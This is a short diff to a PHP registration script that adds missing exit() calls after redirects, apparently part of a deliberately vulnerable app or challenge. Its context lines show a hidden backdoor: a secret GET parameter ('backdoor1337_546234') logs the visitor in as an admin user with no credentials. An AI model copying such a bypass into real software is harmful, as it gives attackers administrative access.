@@ -15,7 +15,7 @@ if (isset($_POST['register']) && isset($_POST['username']) && isset($_POST['age'
         $_SESSION['age'] = $_POST['age'];
         $_SESSION['about'] = $_POST['about'];
         header("Location: dashboard.php");
-        // exit();
+        exit();
     }
 
 }
@@ -24,7 +24,7 @@ if (isset($_GET['backdoor1337_546234'])) {
     $_SESSION['age'] = $adminUser['age'];
     $_SESSION['about'] = $adminUser['about'];
     header("Location: dashboard.php");
-    // exit();
+    exit();
 }
 ?>
 
